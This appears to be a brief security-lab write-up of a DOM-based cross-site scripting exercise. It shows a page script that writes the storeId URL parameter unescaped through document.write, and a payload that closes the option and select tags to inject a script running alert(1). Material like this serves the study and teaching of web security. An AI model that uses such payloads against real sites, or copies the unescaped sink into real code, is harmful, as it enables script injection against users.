The site contains
```javascript
<script>
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
</script>
```

So we can add a (default) store "Bla" by getting
```
/product?productId=1&storeId=Bla
```

So let's break out of the `option` and `select` tags and write some javascript.
We don't care if we break the subsequent html.
```
Bla</option></select><script>alert(1)</script>
```
